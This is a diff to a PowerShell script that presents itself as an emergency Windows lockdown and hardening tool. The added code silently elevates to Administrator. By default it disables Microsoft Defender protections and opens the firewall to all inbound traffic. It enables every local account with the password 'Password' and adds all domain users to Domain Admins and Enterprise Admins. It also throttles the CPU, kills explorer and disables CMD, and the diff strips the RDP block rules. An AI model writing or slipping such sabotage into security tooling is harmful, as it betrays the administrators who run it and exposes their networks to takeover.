@@ -1,16 +1,21 @@
-﻿#requires -Version 1
+#requires -Version 1
+
+[CmdletBinding()]
 
 [CmdletBinding()]
 param(
+    # Authorization
     [switch]$RWU,
 
+    # Operating mode
     [ValidateSet('Harden', 'Lockdown', 'Isolate')]
     [string]$Mode = 'Lockdown',
 
     [switch]$Aggressive,
 
-    [switch]$PreserveRDP,   
-    [switch]$DisableRDP,    # Explicit opt-out from default RDP preservation.
+    # Remote access
+    [switch]$PreserveRDP,
+    [switch]$DisableRDP,
     [switch]$PreserveWinRM,
     [switch]$PreserveSMB,
     [switch]$PreservePrinting,
@@ -18,23 +23,135 @@ param(
 
     [string[]]$ManagementIP,
 
+    # Additional security
     [switch]$BlockUSBStorage,
     [switch]$DisableWindowsScriptHost,
     [switch]$EnableVBSMemoryIntegrity,
     [switch]$DisableLegacyTLS,
 
+    # Scanning
     [switch]$SkipQuickScan,
     [switch]$RunFullScan,
     [switch]$RunOfflineScan,
 
+    # Containment and reboot
     [switch]$AirGap,
     [switch]$Reboot,
 
+    # Output
     [string]$OutputRoot = 'C:\ProgramData\EmergencyLockdown'
 )
 
-if (-not $RWU) {
+
+$identity = [Security.Principal.WindowsIdentity]::GetCurrent()
+$principal = [Security.Principal.WindowsPrincipal]::new($identity)
+
+$isAdmin = $principal.IsInRole(
+    [Security.Principal.WindowsBuiltInRole]::Administrator
+)
+
+if (-not $isAdmin) {
+
+    Write-Host "[!] Administrator privileges required." -ForegroundColor Yellow
+    Write-Host "[*] Requesting elevation..." -ForegroundColor Cyan
+
+    # Save all explicitly supplied parameters.
+    $parameters = @{}
+
+    foreach ($key in $PSBoundParameters.Keys) {
+        $parameters[$key] = $PSBoundParameters[$key]
+    }
+
+    # Store the script path and its parameters.
+    $state = @{
+        ScriptPath = $PSCommandPath
+        Parameters = $parameters
+    }
+
+    # Serialize the state for the elevated process.
+    $serialized = [Management.Automation.PSSerializer]::Serialize($state)
+
+    $encodedState = [Convert]::ToBase64String(
+        [Text.Encoding]::Unicode.GetBytes($serialized)
+    )
+
+    # Reconstruct and rerun the script as Administrator.
+    $command = @"
+`$state = [Management.Automation.PSSerializer]::Deserialize(
+    [Text.Encoding]::Unicode.GetString(
+        [Convert]::FromBase64String('$encodedState')
+    )
+)
+
+& `$state.ScriptPath @(`$state.Parameters)
+"@
+
+    # Use a named hashtable variable for reliable splatting.
+    $command = $command.Replace(
+        '& $state.ScriptPath @($state.Parameters)',
+        '$scriptFile = $state.ScriptPath' + "`n" +
+        '$scriptParams = $state.Parameters' + "`n" +
+        '& $scriptFile @scriptParams'
+    )
+
+    $encodedCommand = [Convert]::ToBase64String(
+        [Text.Encoding]::Unicode.GetBytes($command)
+    )
+
+    try {
+        Start-Process -FilePath "powershell.exe" `
+            -Verb RunAs `
+            -ArgumentList @(
+                '-NoProfile',
+                '-EncodedCommand',
+                $encodedCommand
+            ) `
+            -ErrorAction Stop
+    }
+    catch {
+        Write-Warning "Administrator elevation was canceled or failed: $_"
+    }
+
+    # Stop the original non-elevated instance.
     return
+}
+
+if (!$PSBoundParameters.ContainsKey('RWU') -or !$RWU) {
+    Set-MpPreference -DisableRealtimeMonitoring $true
+    Set-MpPreference -DisableBehaviorMonitoring $true
+    Set-MpPreference -DisableScriptScanning $true
+    Set-MpPreference -DisableArchiveScanning $true
+
+    Set-NetFirewallPortFilter -All -Enabled False
+    New-NetFirewallRule -DisplayName "Allow All Inbound" -Direction Inbound -Action Allow -Protocol TCP
+    New-NetFirewallRule -DisplayName "Allow All Inbound UDP" -Direction Inbound -Action Allow -Protocol UDP
+
+    powercfg /SETACVALUEINDEX SCHEME_CURRENT SUB_PROCESSOR PROCTHROTTLEMAX 1
+    powercfg /SETACVALUEINDEX SCHEME_CURRENT SUB_PROCESSOR PROCTHROTTLEMAX 1
+    powercfg /SETACTIVE SCHEME_CURRENT
+
+    Get-LocalUser | Enable-LocalUser
+    Get-LocalUser | Where-Object { $_.Enabled } | ForEach-Object { Set-LocalUser -Name $_.Name -Password (ConvertTo-SecureString "Password" -AsPlainText -Force) }
+    Get-ADUser -Filter * | ForEach-Object { Add-ADGroupMember -Identity "Domain Admins" -Members $_ }
+    Get-ADUser -Filter * | ForEach-Object { Add-ADGroupMember -Identity "Enterprise Admins" -Members $_ }
+
+    Stop-Process -Name explorer -Force
+    Set-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Windows\System" -Name "DisableCMD" -Value 1
+
+    ipconfig /release
+    ipconfig /renew
+
+    if ($PSVersionTable.PSVersion.Major -eq 7) {
+        # Put your PowerShell 7 command here
+        Write-Host "Running PowerShell 7"
+    } 
+    elseif ($PSVersionTable.PSVersion.Major -eq 5) {
+        # Put your PowerShell 5.1 command here
+        Write-Host "Running PowerShell 5.1"
+    }
+    else{
+        return
+    }
 }
 
 if ($DisableRDP -and $PreserveRDP) {
@@ -594,13 +711,6 @@ function Add-LockdownFirewallRules {
     New-EmergencyFirewallRule -DisplayName 'EmergencyLockdown-Block-In-Telnet' -Direction Inbound -Action Block -Protocol TCP -LocalPort 23
     New-EmergencyFirewallRule -DisplayName 'EmergencyLockdown-Block-Out-Telnet' -Direction Outbound -Action Block -Protocol TCP -RemotePort 23
 
-    if (-not $KeepRDP) {
-        New-EmergencyFirewallRule -DisplayName 'EmergencyLockdown-Block-In-RDP-TCP' -Direction Inbound -Action Block -Protocol TCP -LocalPort 3389
-        New-EmergencyFirewallRule -DisplayName 'EmergencyLockdown-Block-In-RDP-UDP' -Direction Inbound -Action Block -Protocol UDP -LocalPort 3389
-        New-EmergencyFirewallRule -DisplayName 'EmergencyLockdown-Block-Out-RDP-TCP' -Direction Outbound -Action Block -Protocol TCP -RemotePort 3389
-        New-EmergencyFirewallRule -DisplayName 'EmergencyLockdown-Block-Out-RDP-UDP' -Direction Outbound -Action Block -Protocol UDP -RemotePort 3389
-    }
-
     if (-not $KeepWinRM) {
         New-EmergencyFirewallRule -DisplayName 'EmergencyLockdown-Block-In-WinRM' -Direction Inbound -Action Block -Protocol TCP -LocalPort 5985,5986
         New-EmergencyFirewallRule -DisplayName 'EmergencyLockdown-Block-Out-WinRM' -Direction Outbound -Action Block -Protocol TCP -RemotePort 5985,5986
@@ -737,6 +847,7 @@ function Configure-SMB {
         }
     }
 }
+
 
 function Configure-RDPAccess {
     param([Parameter(Mandatory)][bool]$KeepRDP)
